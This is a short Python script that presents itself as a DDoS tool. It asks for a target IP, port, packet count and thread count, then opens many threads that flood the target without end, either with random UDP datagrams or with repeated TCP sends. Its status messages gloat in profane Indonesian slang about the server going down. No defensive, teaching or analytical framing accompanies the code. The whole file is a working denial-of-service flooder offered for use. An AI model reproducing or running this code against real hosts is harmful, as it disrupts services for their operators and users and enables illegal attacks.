#!/usr/bin/env python3
#Ddos by VinzProPler
import random
import socket
import threading
import os

os.system("clear")
print ("DDoS Mod By VinzProPler")
print ("AUTOR : VINZPROPLER CODE : VNZPRP")
ip = str(input(" DdosAttackByVinzProPler | Ip:"))
port = int(input(" DdosAttackByVinzProPler | Port:"))
choice = str(input(" DdosAttackByVinzProPler | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByVinzProPler | Packets:"))
threads = int(input(" DdosAttackByXalbador | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | VinzProPler |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" JANJI GA DOWN 😅")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
